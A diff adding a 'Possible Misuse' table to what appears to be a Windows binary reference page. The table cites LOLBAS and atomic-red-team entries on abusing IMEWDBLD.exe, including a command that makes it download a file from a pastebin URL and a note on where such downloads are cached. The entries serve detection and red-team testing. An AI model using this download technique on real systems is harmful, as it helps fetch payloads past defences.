@@ -338,6 +338,83 @@
   </tbody>
 </table>
 
+<h2 id="possible-misuse">Possible Misuse</h2>
+
+<p><em>The following table contains possible examples of <code class="language-plaintext highlighter-rouge">IMEWDBLD.EXE</code> being misused. While <code class="language-plaintext highlighter-rouge">IMEWDBLD.EXE</code> is <strong>not</strong> inherently malicious, its legitimate functionality can be abused for malicious purposes.</em></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Source</th>
+      <th>Source File</th>
+      <th>Example</th>
+      <th>License</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml">IMEWDBLD.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Name</span><span class="pi">:</span> <span class="s">IMEWDBLD.exe</span></code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml">IMEWDBLD.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Command</span><span class="pi">:</span> <span class="s">C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw</span></code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml">IMEWDBLD.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Description</span><span class="pi">:</span> <span class="s">IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\&lt;8_RANDOM_ALNUM_CHARS&gt;/&lt;FILENAME&gt;[1].&lt;EXTENSION&gt; or %LocalAppData%\Microsoft\Windows\INetCache\IE\&lt;8_RANDOM_ALNUM_CHARS&gt;/&lt;FILENAME&gt;[1].&lt;EXTENSION&gt;</span></code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml">IMEWDBLD.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="na">Path</span><span class="pi">:</span> <span class="s">C:\Windows\System32\IME\SHARED\IMEWDBLD.exe</span></code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md">index.md</a></td>
+      <td>- Atomic Test #17: Download a file with IMEWDBLD.exe [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md">windows-index.md</a></td>
+      <td>- Atomic Test #17: Download a file with IMEWDBLD.exe [windows]</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md">T1105.md</a></td>
+      <td>- <a href="#atomic-test-17---download-a-file-with-imewdbldexe">Atomic Test #17 - Download a file with IMEWDBLD.exe</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md">T1105.md</a></td>
+      <td>## Atomic Test #17 - Download a file with IMEWDBLD.exe</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md">T1105.md</a></td>
+      <td>Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md">T1105.md</a></td>
+      <td>$imewdbled = $env:SystemRoot + “\System32\IME\SHARED\IMEWDBLD.exe”</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+  </tbody>
+</table>
+
 <p>MIT License. Copyright (c) 2020-2021 Strontic.</p>
 
 
